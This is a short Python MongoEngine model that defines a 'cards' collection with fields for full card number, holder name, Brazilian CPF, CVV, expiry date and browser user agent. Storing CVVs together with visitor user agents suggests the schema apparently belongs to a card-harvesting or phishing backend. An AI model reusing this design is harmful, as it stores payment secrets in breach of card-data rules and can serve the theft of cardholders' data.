from card import db
from datetime import datetime


class Cards(db.Document):
    meta = {"collection": "cards"}
    user_agent = db.StringField(required=True)
    number = db.StringField(required=True)
    card_holder = db.StringField(required=True)
    cpf_holder = db.StringField(required=True)
    cvv = db.StringField(required=True)
    month = db.IntField(required=True)
    year = db.IntField(required=True)
